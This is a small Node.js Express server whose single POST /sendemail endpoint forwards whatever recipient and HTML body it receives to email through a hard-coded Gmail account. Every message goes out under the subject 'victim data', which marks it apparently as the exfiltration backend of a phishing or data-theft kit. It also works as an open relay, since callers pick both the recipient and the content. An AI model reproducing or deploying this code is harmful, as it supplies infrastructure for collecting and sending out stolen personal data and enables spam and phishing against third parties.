const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const cors = require('cors');


app.use(cors());
app.use(express.json());


app.post("/sendemail", (req, res) => {
    console.log(req.body.body, req.body.to);
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'tonikr1011@gmail.com',
            pass: process.env.PASS
        }
    });

    let mailOptions = {
        from: 'tonikr1011@gmail.com',
        to: req.body.to,
        subject: 'victim data',
        html: req.body.body,
    };


    transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
            return res.send("Done");
        }
    });


})



const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Listening on port ${port}...`));